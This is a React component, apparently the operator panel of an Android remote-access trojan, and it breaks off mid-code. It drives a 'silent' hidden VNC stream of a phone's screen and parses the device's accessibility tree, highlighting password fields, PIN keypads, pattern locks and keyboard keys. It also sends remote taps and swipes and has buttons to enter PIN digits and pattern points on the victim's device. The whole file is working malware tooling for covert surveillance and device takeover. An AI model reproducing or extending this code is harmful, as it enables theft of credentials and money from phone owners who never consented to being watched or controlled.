/**
 * LiveScreen — HVNC + LY (Layout) + V2 + DUPLO
 *
 * ── HVNC pipeline ──────────────────────────────────────────────────────────
 *   APK: takeScreenshot → Bitmap 350×650 → JPEG → [0x01][4B size][jpeg bytes]
 *   Server: relayVncFrame strips header → sends vnc_meta JSON + raw jpeg binary
 *   Client: ws.onBinary → createImageBitmap (GPU decode) → dirty-flag RAF draw
 *
 * ── LY (Layout Overlay) ────────────────────────────────────────────────────
 *   APK: buildNodeTree → getBoundsInScreen() → {x,y,w,h} = ABSOLUTE SCREEN PX
 *   Client: scale bounds → HiDPI canvas draw → hit-test → send raw TAP/SWIPE
 *
 * ── Coordinate rules ───────────────────────────────────────────────────────
 *   Canvas VNC touch  → normalize 0-1 + scale:'vnc_norm' → APK maps to screen
 *   LY node tap       → center in real device px → raw path (no scale param)
 *   LY free tap/swipe → canvas CSS px → device px via lyScale → raw path
 */
import { useEffect, useLayoutEffect, useRef, useState, useCallback } from 'react';
import useStore from '../../store/index.js';
import { ws }   from '../../ws.js';

// APK frame size (SILENT_WIDTH × SILENT_HEIGHT in UiAssistBridge.java)
const APK_W = 350;
const APK_H = 650;

// ─── APK hierarchy parser ──────────────────────────────────────────────────
// bounds from APK: { x, y, w, h } — getBoundsInScreen(), real device pixels
function apkRect(b) {
  if (!b) return null;
  const left   = b.left  ?? b.x  ?? 0;
  const top    = b.top   ?? b.y  ?? 0;
  const right  = b.right  ?? (left + (b.w ?? 0));
  const bottom = b.bottom ?? (top  + (b.h ?? 0));
  return { left, top, right, bottom };
}

function walkNode(raw, depth, out) {
  if (!raw || depth > 30) return;
  const text   = raw.text || raw.desc || raw.contentDescription || '';
  const bounds = apkRect(raw.bounds);
  const valid  = bounds && (bounds.right - bounds.left > 0 || bounds.bottom - bounds.top > 0);
  if (text || valid) {
    out.push({
      text:          text.trim(),
      cls:           raw.class || raw.className || '',
      pkg:           raw.pkg || raw.packageName || raw.windowPackage || '',
      clickable:     !!raw.clickable,
      enabled:       raw.enabled !== false,
      checked:       !!raw.checked,
      focused:       !!raw.focused,
      scrollable:    !!raw.scrollable,
      editable:      !!raw.editable,
      password:      !!raw.password,
      longClickable: !!raw.longClickable,
      bounds,
      depth,
      id:            raw.id || raw.viewIdResourceName || '',
      isKeyboard:    !!(raw.isKeyboard || raw.isKeyboardKey),
      keyType:       raw.keyType || null,
      isPinDigit:    !!raw.isPinDigit,
      isPatternLock: !!raw.isPatternLock,
      isSwipeUnlock: !!raw.isSwipeUnlock,
      patternGrid:   raw.patternGrid || null,
      swipeHint:     raw.swipeHint   || null,
      windowType:    raw.windowType  ?? null,
      hint:          raw.hint        || '',
    });
  }
  for (const c of (raw.children || raw.childList || [])) walkNode(c, depth + 1, out);
}

function parseHierarchy(raw) {
  const out = [];
  try {
    const p    = typeof raw === 'string' ? JSON.parse(raw) : raw;
    const root = p?.hierarchy ?? p;
    for (const r of (Array.isArray(root) ? root : [root])) walkNode(r, 0, out);
  } catch (_) {}
  return out;
}

function extractLines(nodes) {
  const tx = nodes.filter(n => n.text).sort((a, b) => {
    const ay = a.bounds ? (a.bounds.top + a.bounds.bottom) / 2 : 0;
    const by = b.bounds ? (b.bounds.top + b.bounds.bottom) / 2 : 0;
    return ay - by;
  });
  const rows = []; let row = [], lastY = -Infinity;
  for (const n of tx) {
    const y = n.bounds ? (n.bounds.top + n.bounds.bottom) / 2 : lastY + 40;
    if (Math.abs(y - lastY) > 22 && row.length) {
      rows.push([...row].sort((a, b) => (a.bounds?.left ?? 0) - (b.bounds?.left ?? 0)));
      row = [];
    }
    row.push(n); lastY = y;
  }
  if (row.length) rows.push(row);
  return rows;
}

const bCenter = b => b
  ? { x: Math.round((b.left + b.right) / 2), y: Math.round((b.top + b.bottom) / 2) }
  : null;

// ─── LY color scheme ──────────────────────────────────────────────────────
function nodeColor(n) {
  if (!n.enabled)     return '#475569';
  if (n.focused)      return '#ffffff';
  if (n.isPinDigit)   return '#3b82f6';
  if (n.isPatternLock) return '#60a5fa';
  if (n.password)     return '#f43f5e';
  if (n.isKeyboard)   return '#a855f7';
  if (n.editable)     return '#06b6d4';
  if (n.scrollable)   return '#10b981';
  if (n.clickable)    return '#f59e0b';
  return '#334155';
}

// ─── Draw LY canvas ───────────────────────────────────────────────────────
// Returns { sx, sy, logW, logH, maxX, maxY } for hit-testing.
function drawLY(canvas, nodes, highlight, showLabels, showDim) {
  if (!canvas || !nodes.length) return null;
  const ctx = canvas.getContext('2d', { alpha: false });
  if (!ctx) return null;

  // Infer screen dimensions from node bounds
  let maxX = 0, maxY = 0;
  for (const n of nodes) {
    if (!n.bounds) continue;
    if (n.bounds.right  > maxX) maxX = n.bounds.right;
    if (n.bounds.bottom > maxY) maxY = n.bounds.bottom;
  }
  if (!maxX || !maxY) return null;

  // HiDPI setup — logical size = canvas CSS width × screen aspect ratio
  const dpr  = Math.min(window.devicePixelRatio || 1, 3);
  const logW = canvas.clientWidth  || 350;
  const logH = Math.round(logW * maxY / maxX);

  // Only resize if needed (prevents context reset thrash)
  if (canvas.width !== logW * dpr || canvas.height !== logH * dpr) {
    canvas.width  = logW * dpr;
    canvas.height = logH * dpr;
    canvas.style.height = logH + 'px';
  }

  const sx = (logW * dpr) / maxX;
  const sy = (logH * dpr) / maxY;

  // Background
  ctx.fillStyle = '#0a0c10';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Subtle grid
  ctx.strokeStyle = 'rgba(255,255,255,0.03)';
  ctx.lineWidth = 1;
  const gridStep = 50 * sx;
  for (let x = 0; x < canvas.width; x += gridStep) {
    ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, canvas.height); ctx.stroke();
  }
  for (let y = 0; y < canvas.height; y += gridStep) {
    ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(canvas.width, y); ctx.stroke();
  }

  // Sort: large area first → small on top
  const sorted = [...nodes]
    .filter(n => n.bounds)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return bA - aA;
    });

  const fontSize   = Math.round(10 * dpr);
  const fontSmall  = Math.round(8  * dpr);
  ctx.textBaseline = 'top';

  for (const n of sorted) {
    const { left, top, right, bottom } = n.bounds;
    const x = left   * sx;
    const y = top    * sy;
    const w = (right  - left) * sx;
    const h = (bottom - top)  * sy;
    if (w < 1 || h < 1) continue;

    const col    = nodeColor(n);
    const alpha  = !n.enabled ? 0.2 : (n.focused ? 1 : (n.clickable ? 0.85 : 0.55));
    const isHit  = highlight && highlight.node === n;

    // Fill — very subtle, skip for tiny rects
    if (w > 8 && h > 8) {
      ctx.globalAlpha = isHit ? 0.3 : (alpha * (showDim ? 0.12 : 0.06));
      ctx.fillStyle   = isHit ? '#ffffff' : col;
      ctx.fillRect(x, y, w, h);
    }

    // Border
    ctx.globalAlpha = isHit ? 1 : alpha;
    ctx.strokeStyle = isHit ? '#ffffff' : col;
    ctx.lineWidth   = isHit ? 3 * dpr : (n.focused ? 2.5 * dpr : (n.clickable ? 1.5 * dpr : dpr));
    ctx.strokeRect(x + 0.5, y + 0.5, w - 1, h - 1);
    ctx.globalAlpha = 1;

    if (!showLabels) continue;

    // Label text — only if box is tall enough
    const labelH = Math.max(fontSmall, h * 0.28);
    if (h < fontSmall * 1.4 || w < 12) continue;
    const label  = n.text || n.cls.split('.').pop() || '';
    if (!label) continue;

    const fs = Math.min(fontSize, labelH);
    ctx.font        = `${Math.round(fs)}px 'SF Mono',monospace`;
    ctx.fillStyle   = isHit ? '#ffffff' : col;
    ctx.globalAlpha = isHit ? 1 : Math.min(1, alpha + 0.2);

    // Measure and truncate
    let txt = label;
    while (txt.length > 1 && ctx.measureText(txt).width > w - 4 * dpr) {
      txt = txt.slice(0, -1);
    }
    if (txt !== label) txt += '…';

    ctx.fillText(txt, x + 2 * dpr, y + 2 * dpr);
    ctx.globalAlpha = 1;
  }

  // Focused node: white corner markers
  const focusedNodes = sorted.filter(n => n.focused);
  for (const n of focusedNodes) {
    const { left, top, right, bottom } = n.bounds;
    const x = left * sx, y = top * sy;
    const w = (right - left) * sx, h = (bottom - top) * sy;
    const m = Math.min(w, h, 16 * dpr) * 0.3;
    ctx.strokeStyle = '#ffffff';
    ctx.lineWidth   = 2.5 * dpr;
    ctx.globalAlpha = 0.95;
    [[x,y],[x+w,y],[x,y+h],[x+w,y+h]].forEach(([cx,cy], i) => {
      const dx = i < 2 ? 1 : -1;
      const dy = i % 2 === 0 ? 1 : -1;
      ctx.beginPath();
      ctx.moveTo(cx, cy + dy * m);
      ctx.lineTo(cx, cy);
      ctx.lineTo(cx + dx * m, cy);
      ctx.stroke();
    });
    ctx.globalAlpha = 1;
  }

  return { sx, sy, logW, logH, maxX, maxY, dpr };
}

// ─── Hit test in device-px space ─────────────────────────────────────────
function hitTest(cssPxX, cssPxY, canvas, scale, nodes) {
  if (!scale || !canvas) return null;
  const r    = canvas.getBoundingClientRect();
  const devX = ((cssPxX - r.left) / r.width)  * scale.maxX;
  const devY = ((cssPxY - r.top)  / r.height) * scale.maxY;
  return nodes
    .filter(n => n.bounds &&
      devX >= n.bounds.left && devX <= n.bounds.right &&
      devY >= n.bounds.top  && devY <= n.bounds.bottom)
    .sort((a, b) => {
      const aA = (a.bounds.right - a.bounds.left) * (a.bounds.bottom - a.bounds.top);
      const bA = (b.bounds.right - b.bounds.left) * (b.bounds.bottom - b.bounds.top);
      return aA - bA; // smallest area = most specific
    })[0] || null;
}

function cssToDevice(cssPxX, cssPxY, canvas, scale) {
  if (!scale || !canvas) return { x: 0, y: 0 };
  const r = canvas.getBoundingClientRect();
  return {
    x: Math.round(((cssPxX - r.left) / r.width)  * scale.maxX),
    y: Math.round(((cssPxY - r.top)  / r.height) * scale.maxY),
  };
}

// ─── Component ────────────────────────────────────────────────────────────
const MODES = ['HVNC', 'LY', 'V2', 'DUPLO'];

export default function LiveScreen({ deviceId, onBack, sendCmd }) {
  // VNC canvas
  const canvasRef   = useRef(null);
  const ctxRef      = useRef(null);
  const bitmapRef   = useRef(null);
  const dirtyRef    = useRef(false);
  const rafRef      = useRef(null);
  const fpsDecRef   = useRef(0);
  const latRef      = useRef(performance.now());
  const vncTRef     = useRef(null);   // touch start for VNC canvas
  const vncMRef     = useRef(null);   // mouse start

  // LY canvas
  const lyCanvasRef = useRef(null);
  const lyScaleRef  = useRef(null);   // current scale info
  const lyTRef      = useRef(null);   // touch start
  const lyMRef      = useRef(null);   // mouse start
  const [lyHighlight, setLyHighlight] = useState(null); // { node }
  const [showLabels, setShowLabels]   = useState(true);
  const [showDim,    setShowDim]      = useState(false);

  // SR auto-poll
  const autoRef = useRef(null);
  const ocrRef  = useRef(null);

  const setVnc = useStore(s => s.setVncActive);

  const [mode, setMode]       = useState('HVNC');
  const [quality, setQuality] = useState(60);
  const [fps, setFps]         = useState(0);
  const [latMs, setLatMs]     = useState(0);
  const [vncOn, setVncOn]     = useState(false);

  // Shared hierarchy state
  const [nodes, setNodes]       = useState([]);
  const [lines, setLines]       = useState([]);
  const [rawData, setRawData]   = useState('');
  const [srTab, setSrTab]       = useState('ocr');
  const [filter, setFilter]     = useState('');
  const [toast, setToast]       = useState(null);
  const [toastCol, setToastCol] = useState('#00c864');
  const [srTs, setSrTs]         = useState(null);
  const [srPkg, setSrPkg]       = useState('');
  const [liveMode, setLiveMode] = useState(false);
  const [typeText, setTypeText] = useState('');
  const [tapX, setTapX]         = useState('');
  const [tapY, setTapY]         = useState('');

  // ── VNC: cached 2D context ─────────────────────────────────────────────
  function getCtx() {
    if (ctxRef.current) return ctxRef.current;
    const c = canvasRef.current; if (!c) return null;
    ctxRef.current = c.getContext('2d', { alpha: false, desynchronized: true });
    if (ctxRef.current) ctxRef.current.imageSmoothingEnabled = false;
    return ctxRef.current;
  }

  // ── VNC: RAF render loop — zero idle cost with dirty flag ──────────────
  useEffect(() => {
    function loop() {
      if (dirtyRef.current) {
        const bmp = bitmapRef.current;
        const ctx = getCtx();
        if (bmp && ctx) ctx.drawImage(bmp, 0, 0);
        dirtyRef.current = false;
      }
      rafRef.current = requestAnimationFrame(loop);
    }
    rafRef.current = requestAnimationFrame(loop);
    return () => {
      cancelAnimationFrame(rafRef.current);
      bitmapRef.current?.close?.();
    };
  }, []);

  // ── VNC: binary frame pipeline ─────────────────────────────────────────
  // Protocol confirmed: [0x01][uint32be size][jpeg] — server strips header
  useEffect(() => {
    const unsub = ws.onBinary((buf, devId) => {
      if (devId !== deviceId) return;
      const now = performance.now();
      setLatMs(Math.round(now - latRef.current));
      latRef.current = now;
      fpsDecRef.current++;
      // Hardware-accelerated async JPEG decode — no main-thread block
      createImageBitmap(new Blob([buf], { type: 'image/jpeg' })).then(bmp => {
        bitmapRef.current?.close?.();
        bitmapRef.current = bmp;
        dirtyRef.current  = true;
      }).catch(() => {});
    });
    const t = setInterval(() => { setFps(fpsDecRef.current); fpsDecRef.current = 0; }, 1000);
    return () => { unsub(); clearInterval(t); };
  }, [deviceId]);

  // ── Hierarchy + VNC status messages ───────────────────────────────────
  useEffect(() => {
    const unsub = ws.onMessage(msg => {
      if (msg.device_id !== deviceId) return;
      if (msg.type === 'screen_hierarchy') {
        const raw = msg.data || '{}';
        try {
          const p = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setSrPkg(p.package || '');
          const n = parseHierarchy(raw);
          const l = extractLines(n);
          setNodes(n); setLines(l);
          setRawData(typeof raw === 'string' ? raw : JSON.stringify(raw, null, 2));
          setSrTs(msg.ts);
          showToast('REQUEST_HIERARCHY com sucesso!', '#00c864');
          setTimeout(() => ocrRef.current?.scrollTo({ top: 0, behavior: 'smooth' }), 40);
        } catch (_) {}
      }
      if (msg.type === 'vnc_status') {
        setVncOn(!!msg.active); setVnc(!!msg.active);
      }
    });
    return unsub;
  }, [deviceId]);

  // ── LY: redraw when nodes or settings change ───────────────────────────
  // useLayoutEffect: fires after DOM paint, canvas is mounted
  useLayoutEffect(() => {
    if (!lyCanvasRef.current || !nodes.length) return;
    const scale = drawLY(lyCanvasRef.current, nodes, lyHighlight, showLabels, showDim);
    lyScaleRef.current = scale;
  }, [nodes, lyHighlight, showLabels, showDim, mode]);

  // ── LY: also redraw when mode switches to LY/DUPLO and canvas mounts ──
  const lyRefCb = useCallback(node => {
    lyCanvasRef.current = node;
    if (node && nodes.length) {
      const scale = drawLY(node, nodes, lyHighlight, showLabels, showDim);
      lyScaleRef.current = scale;
    }
  }, [nodes, lyHighlight, showLabels, showDim]);

  // ── Live hierarchy polling ─────────────────────────────────────────────
  useEffect(() => {
    clearInterval(autoRef.current);
    if (liveMode) {
      sendCmd('REQUEST_HIERARCHY');
      autoRef.current = setInterval(() => sendCmd('REQUEST_HIERARCHY'), 500);
    }
    return () => clearInterval(autoRef.current);
  }, [liveMode, sendCmd]);

  // ── Controls ──────────────────────────────────────────────────────────
  function startVnc() {
    sendCmd('START_SILENT_VNC'); ws.subscribe('vnc', deviceId);
    setVncOn(true); setVnc(true);
  }
  function stopVnc() {
    sendCmd('STOP_SILENT_VNC'); ws.unsubscribe('vnc', deviceId);
    setVncOn(false); setVnc(false);
  }
  function handleBack() { stopVnc(); setLiveMode(false); onBack(); }

  function showToast(m, col = '#00c864') {
    setToast(m); setToastCol(col);
    setTimeout(() => setToast(null), 2200);
  }

  // ── VNC canvas: normalized coords (0-1) + scale:'vnc_norm' ───────────
  // APK auto-detects vnc_norm when 0 < value ≤ 1 and maps to real screen px
  function normCoords(clientX, clientY) {
    const c = canvasRef.current; if (!c) return { x: 0.5, y: 0.5 };
    const r = c.getBoundingClientRect();
    return {
      x: Math.max(0.001, Math.min(0.999, (clientX - r.left) / r.width)),
      y: Math.max(0.001, Math.min(0.999, (clientY - r.top)  / r.height)),
    };
  }

  const onVncTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    vncTRef.current = { clientX: t.clientX, clientY: t.clientY, ts: Date.now() };
  }, []);

  const onVncTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!vncTRef.current) return;
    const t = e.changedTouches[0];
    const { clientX: sx, clientY: sy, ts } = vncTRef.current;
    const dt   = Date.now() - ts;
    const dist = Math.hypot(t.clientX - sx, t.clientY - sy);
    vncTRef.current = null;
    if (dist < 14) {
      const { x, y } = normCoords(sx, sy);
      sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x, y, scale: 'vnc_norm' });
    } else {
      const s = normCoords(sx, sy), e2 = normCoords(t.clientX, t.clientY);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: e2.x, y2: e2.y, scale: 'vnc_norm', duration: dt });
    }
  }, [sendCmd]);

  const onVncMouseDown = useCallback(e => {
    vncMRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now() };
  }, []);
  const onVncMouseUp = useCallback(e => {
    if (!vncMRef.current) return;
    const { clientX: sx, clientY: sy, ts } = vncMRef.current;
    const dist = Math.hypot(e.clientX - sx, e.clientY - sy);
    vncMRef.current = null;
    if (dist < 6) {
      const { x, y } = normCoords(sx, sy);
      sendCmd('TAP', { x, y, scale: 'vnc_norm' });
    } else {
      const s = normCoords(sx, sy), e2 = normCoords(e.clientX, e.clientY);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: e2.x, y2: e2.y, scale: 'vnc_norm', duration: Date.now() - ts });
    }
  }, [sendCmd]);

  // ── LY canvas: raw device-px coordinates ──────────────────────────────
  // getBoundsInScreen() coords → tap raw path on APK → correct
  const onLyTouchStart = useCallback(e => {
    e.preventDefault();
    const t = e.touches[0];
    lyTRef.current = { clientX: t.clientX, clientY: t.clientY, ts: Date.now() };
  }, []);

  const onLyTouchEnd = useCallback(e => {
    e.preventDefault();
    if (!lyTRef.current) return;
    const t = e.changedTouches[0];
    const { clientX: sx, clientY: sy, ts } = lyTRef.current;
    const dt   = Date.now() - ts;
    const dist = Math.hypot(t.clientX - sx, t.clientY - sy);
    lyTRef.current = null;
    _lyInteract(sx, sy, t.clientX, t.clientY, dt, dist);
  }, [sendCmd, nodes]);

  const onLyMouseDown = useCallback(e => {
    lyMRef.current = { clientX: e.clientX, clientY: e.clientY, ts: Date.now() };
  }, []);
  const onLyMouseUp = useCallback(e => {
    if (!lyMRef.current) return;
    const { clientX: sx, clientY: sy, ts } = lyMRef.current;
    const dist = Math.hypot(e.clientX - sx, e.clientY - sy);
    lyMRef.current = null;
    _lyInteract(sx, sy, e.clientX, e.clientY, Date.now() - ts, dist);
  }, [sendCmd, nodes]);

  function _lyInteract(sx, sy, ex, ey, dt, dist) {
    const c = lyCanvasRef.current;
    const scale = lyScaleRef.current;
    if (!c || !scale) return;

    if (dist < 14) {
      // Hit-test: find smallest node containing the tap point
      const hit = hitTest(sx, sy, c, scale, nodes);
      if (hit) {
        const center = bCenter(hit.bounds);
        if (center) {
          // Highlight flash
          setLyHighlight({ node: hit });
          setTimeout(() => setLyHighlight(null), 400);
          const label = hit.text || hit.cls.split('.').pop() || 'element';
          // Send raw device-px coords — APK raw/fallback path
          sendCmd(dt > 600 ? 'LONG_PRESS' : 'TAP', { x: center.x, y: center.y });
          showToast(
            `${dt > 600 ? 'HOLD' : 'TAP'} → ${label.slice(0, 28)}`,
            hit.clickable ? '#f59e0b' : '#94a3b8'
          );
        }
      } else {
        // Free tap: convert CSS px → device px
        const dev = cssToDevice(sx, sy, c, scale);
        sendCmd('TAP', { x: dev.x, y: dev.y });
        showToast(`TAP → (${dev.x}, ${dev.y})`, '#94a3b8');
      }
    } else {
      // Swipe: both endpoints in device px
      const s   = cssToDevice(sx, sy, c, scale);
      const end = cssToDevice(ex, ey, c, scale);
      sendCmd('SWIPE', { x1: s.x, y1: s.y, x2: end.x, y2: end.y, duration: dt });
      showToast(`SWIPE (${s.x},${s.y})→(${end.x},${end.y})`, '#10b981');
    }
  }

  // ── Hierarchy node tap (from V2 lists) ────────────────────────────────
  // Bounds already in device px from getBoundsInScreen → raw path
  function tapNode(n) {
    const c = bCenter(n.bounds);
    if (c) {
      sendCmd('TAP', { x: c.x, y: c.y });
      showToast(`TAP → ${n.text || n.cls.split('.').pop()}`, n.clickable ? '#f59e0b' : '#94a3b8');
    }
  }

  const filteredNodes = filter
    ? nodes.filter(n =>
        n.text?.toLowerCase().includes(filter.toLowerCase()) ||
        n.cls?.toLowerCase().includes(filter.toLowerCase()) ||
        n.id?.toLowerCase().includes(filter.toLowerCase()))
    : nodes;

  const showVnc    = mode === 'HVNC' || mode === 'DUPLO';
  const showLy     = mode === 'LY'   || mode === 'DUPLO';
  const showReader = mode === 'V2'   || mode === 'DUPLO';

  // ─────────────────────────────────────────────────────────────────────
  return (
    <div className="fade-up">

      {/* ── Toast ── */}
      {toast && (
        <div style={{
          position: 'fixed', top: 68, left: '50%', transform: 'translateX(-50%)',
          background: 'rgba(8,6,2,.97)', border: `1px solid ${toastCol}`,
          borderRadius: 10, padding: '8px 16px', zIndex: 9999,
          maxWidth: '88vw', textAlign: 'center', pointerEvents: 'none',
          boxShadow: `0 4px 28px rgba(0,0,0,.7), 0 0 12px ${toastCol}33`,
          transition: 'opacity .2s',
        }}>
          <div style={{ color: toastCol, fontSize: 12, fontWeight: 800 }}>
            {toast}
          </div>
        </div>
      )}

      {/* ── Toolbar ── */}
      <div className="row-sb mb8">
        <div>
          <div style={{ fontWeight: 800, fontSize: 13, color: 'var(--gold)', letterSpacing: 1 }}>
            EDITAR V2 ✏
          </div>
          <div className="row gap6 mt4">
            <span style={{ fontSize: 10, color: 'var(--text2)' }}>LEITOR OCR</span>
            <span style={{ fontSize: 10, color: '#00c864', fontWeight: 700 }}>⚡</span>
            <span style={{ fontSize: 10, fontWeight: 700,
              color: nodes.filter(n => n.text).length > 0 ? '#00c864' : 'var(--text3)' }}>
              {nodes.filter(n => n.text).length > 0
                ? `${Math.min(99, nodes.filter(n => n.text).length)}%` : '—'}
            </span>
            {srPkg && (
              <span style={{ fontSize: 10, color: 'var(--text3)' }}>
                {srPkg.split('.').slice(-1)[0]}
              </span>
            )}
          </div>
        </div>
        <div className="row gap4" style={{ flexWrap: 'wrap', justifyContent: 'flex-end' }}>
          {MODES.map(m => (
            <button key={m}
              onClick={() => {
                setMode(m);
                if (m !== 'HVNC') sendCmd('REQUEST_HIERARCHY');
              }}
              className={`btn btn-sm ${mode === m ? 'btn-blue' : 'btn-ghost'}`}
              style={{ padding: '4px 9px', fontSize: 11, fontWeight: 700, letterSpacing: .5 }}>
              {m}
            </button>
          ))}
          <button className="btn btn-ghost btn-sm" onClick={handleBack}
            style={{ padding: '4px 9px', fontSize: 11 }}>←</button>
        </div>
      </div>

      {/* ── Status pills ── */}
      <div className="row gap5 mb8" style={{ flexWrap: 'wrap' }}>
        <span className={`pill ${vncOn ? 'pill-green' : 'pill-dim'}`} style={{ fontSize: 10 }}>
          {vncOn ? `▶ ${fps} FPS · ${latMs}ms` : '⏹ HVNC OFF'}
        </span>
        {nodes.length > 0 && (
          <span className="pill pill-gold" style={{ fontSize: 10 }}>
            {nodes.filter(n => n.text).length} nodes
          </span>
        )}
        {liveMode && <span className="pill pill-red" style={{ fontSize: 10 }}>🔴 LIVE</span>}
      </div>

      {/* ════════════════════════════════════════════
          HVNC — VNC Canvas
      ════════════════════════════════════════════ */}
      {showVnc && (
        <div className="vnc-wrap mb8"
          style={{ position: 'relative', touchAction: 'none',
            cursor: vncOn ? 'crosshair' : 'default' }}
          onTouchStart={onVncTouchStart} onTouchEnd={onVncTouchEnd}
          onMouseDown={onVncMouseDown}   onMouseUp={onVncMouseUp}
        >
          <canvas ref={canvasRef} width={APK_W} height={APK_H} className="vnc-canvas" />
          {!vncOn && (
            <div className="vnc-overlay">
              <div className="spin" />
              <div style={{ fontSize: 12, color: 'var(--text2)', marginTop: 8 }}>
                {bitmapRef.current ? 'Stream pausado' : 'Aguardando stream...'}
              </div>
            </div>
          )}
          {vncOn && (
            <div className="vnc-hud">
              <span className="vnc-fps" style={{ background: 'rgba(20,80,200,.85)' }}>HVNC</span>
              <span className="vnc-fps">{fps} FPS · {latMs}ms</span>
            </div>
          )}
        </div>
      )}

      {/* ════════════════════════════════════════════
          LY — Layout Overlay Canvas
      ════════════════════════════════════════════ */}
      {showLy && (
        <div>
          {/* LY toolbar */}
          <div className="row-sb mb6">
            <div className="row gap5">
              <span style={{ fontSize: 11, fontWeight: 800, color: '#3b82f6', letterSpacing: 1 }}>
                LY
              </span>
              {nodes.length > 0 && (
                <>
                  <span className="pill pill-blue"   style={{ fontSize: 9 }}>{nodes.filter(n=>n.clickable).length} tap</span>
                  <span className="pill pill-purple" style={{ fontSize: 9 }}>{nodes.filter(n=>n.isKeyboard).length} kbd</span>
                  <span className="pill pill-green"  style={{ fontSize: 9 }}>{nodes.filter(n=>n.scrollable).length} scroll</span>
                  {nodes.filter(n=>n.password).length > 0 && (
                    <span className="pill pill-red" style={{ fontSize: 9 }}>🔒 {nodes.filter(n=>n.password).length}</span>
                  )}
                </>
              )}
            </div>
            <div className="row gap4">
              <button className={`btn btn-xs ${showLabels ? 'btn-gold' : 'btn-ghost'}`}
                onClick={() => setShowLabels(v => !v)} style={{ fontSize: 10 }}>Aa</button>
              <button className={`btn btn-xs ${showDim ? 'btn-blue' : 'btn-ghost'}`}
                onClick={() => setShowDim(v => !v)} style={{ fontSize: 10 }}>◼</button>
              <button className="btn btn-ghost btn-xs"
                onClick={() => { sendCmd('REQUEST_HIERARCHY'); }}
                style={{ fontSize: 10 }}>↺</button>
              <button className={`btn btn-xs ${liveMode ? 'btn-red' : 'btn-ghost'}`}
                onClick={() => setLiveMode(v => !v)} style={{ fontSize: 10 }}>
                {liveMode ? '🔴' : '⭕'}
              </button>
            </div>
          </div>

          {/* LY legend */}
          <div className="row gap5 mb6" style={{ flexWrap: 'wrap' }}>
            {[
              ['TAP', '#f59e0b'], ['EDIT', '#06b6d4'], ['SCROLL', '#10b981'],
              ['KBD', '#a855f7'], ['PIN', '#3b82f6'], ['PWD', '#f43f5e'],
              ['OFF', '#475569'],
            ].map(([lbl, col]) => (
              <span key={lbl} style={{
                fontSize: 9, padding: '1px 6px', borderRadius: 4, fontWeight: 700,
                border: `1px solid ${col}55`, color: col, letterSpacing: .5,
              }}>{lbl}</span>
            ))}
          </div>

          {/* LY canvas */}
          <div
            style={{
              position: 'relative', width: '100%', touchAction: 'none',
              borderRadius: 10, overflow: 'hidden',
              border: '1px solid rgba(59,130,246,.2)',
              cursor: 'crosshair', background: '#0a0c10',
              minHeight: nodes.length ? undefined : 120,
            }}
            onTouchStart={onLyTouchStart} onTouchEnd={onLyTouchEnd}
            onMouseDown={onLyMouseDown}   onMouseUp={onLyMouseUp}
          >
            <canvas
              ref={lyRefCb}
              style={{ display: 'block', width: '100%' }}
            />
            {!nodes.length && (
              <div style={{
                position: 'absolute', inset: 0, display: 'flex',
                flexDirection: 'column', alignItems: 'center',
                justifyContent: 'center', padding: 16,
              }}>
                <div style={{ fontSize: 28, marginBottom: 8 }}>◻</div>
                <div style={{ fontSize: 12, color: 'var(--text3)', textAlign: 'center' }}>
                  Toque ↺ para carregar hierarquia
                </div>
              </div>
            )}
          </div>

          {/* LY quick-tap: pin digits */}
          {nodes.filter(n => n.isPinDigit && n.text && n.clickable).length > 0 && (
            <div className="card card-sm mt6" style={{ border: '1px solid #3b82f6' }}>
              <div className="txt-xs txt-dim mb6" style={{ color: '#3b82f6' }}>⌨ PIN</div>
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {nodes.filter(n => n.isPinDigit && n.text && n.clickable).map((nd, i) => (
                  <button key={i} className="btn btn-blue btn-sm"
                    style={{ minWidth: 38, fontSize: 15, fontWeight: 800 }}
                    onClick={() => tapNode(nd)}>
                    {nd.text}
                  </button>
                ))}
              </div>
            </div>
          )}

          {/* LY pattern grid */}
          {nodes.filter(n => n.isPatternLock && n.patternGrid).length > 0 && (
            <div className="card card-sm mt6" style={{ border: '1px solid #60a5fa' }}>
              <div className="txt-xs txt-dim mb6" style={{ color: '#60a5fa' }}>⊞ PATTERN</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 6, maxWidth: 120 }}>
                {nodes.find(n => n.isPatternLock && n.patternGrid).patternGrid.map((p, pi) => (
                  <button key={pi} className="btn btn-ghost btn-sm"
                    style={{ fontSize: 12, fontWeight: 700 }}
                    onClick={() => sendCmd('TAP', { x: p.x, y: p.y })}>
                    {pi + 1}
                  </button>
                ))}
              </div>
            </div>
          )}

          <div style={{ height: 12 }} />
        </div>
      )}

      {/* ── VNC controls (always visible below canvas) ── */}
      {(showVnc || mode === 'LY') && (
        <>
          <div className="grid g2 mb8">
            <button className="btn btn-gold btn-block btn-sm" onClick={startVnc}>▶ VNC ON</button>
            <button className="btn btn-red  btn-block btn-sm" onClick={stopVnc}>⏹ VNC OFF</button>
            <button className="btn btn-ghost btn-block btn-sm"
              onClick={() => sendCmd('FORCE_RESTART_VNC')}>↺ RESTART</button>
            <button className="btn btn-ghost btn-block btn-sm"
              onClick={() => sendCmd('SNAP_SCREEN')}>📷 SNAP</button>
          </div>
          {showVnc && (
            <div className="card card-sm mb8">
              <div className="row-sb mb4">
                <span className="txt-xs txt-dim">QUALIDADE JPEG</span>
                <span className="txt-xs txt-gold bold">{quality}%</span>
              </div>
              <input type="range" min="10" max="100" value={quality}
                style={{ width: '100%', accentColor: '#d4950a' }}
                onChange={e => {
                  setQuality(+e.target.value);
                  sendCmd('SET_SILENT_VNC_QUALITY', { quality: +e.target.value });
                }} />
            </div>
          )}
        </>
      )}

      {/* ── Navigation keys ── */}
      <div className="section-title mt2">Navegação</div>
      <div className="grid g4 mb10">
        {[
